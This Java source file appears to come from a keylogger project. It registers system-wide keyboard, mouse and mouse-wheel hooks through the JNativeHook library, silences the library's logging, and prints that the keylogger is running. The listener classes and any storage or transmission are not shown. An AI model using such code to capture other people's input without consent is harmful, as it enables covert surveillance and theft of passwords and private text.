package rwilk.logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Created by wilkr on 02.05.2017.
 * RegisterNativeHook
 */
public class RegisterNativeHook {

    public static void registerNativeHook(){
        Logger loggerListener = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        loggerListener.setLevel(Level.OFF);

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(e.getMessage());
        }

        GlobalKeyListener keyListener = new GlobalKeyListener();
        GlobalMouseListener mouseListener = new GlobalMouseListener();
        GlobalMouseWheelListener mouseWheelListener = new GlobalMouseWheelListener();

        GlobalScreen.addNativeKeyListener(keyListener);
        GlobalScreen.addNativeMouseListener(mouseListener);
        GlobalScreen.addNativeMouseMotionListener(mouseListener);
        GlobalScreen.addNativeMouseWheelListener(mouseWheelListener);

        System.out.println("KeyLogger is running...");
    }
}
